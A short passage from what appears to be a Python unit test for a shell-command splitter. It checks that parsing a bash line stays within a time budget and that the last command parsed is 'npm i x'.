    cmds = split_commands(line, "bash")
    assert time.perf_counter() - start < BUDGET * 5
    assert cmds[-1].argv == ["npm", "i", "x"]
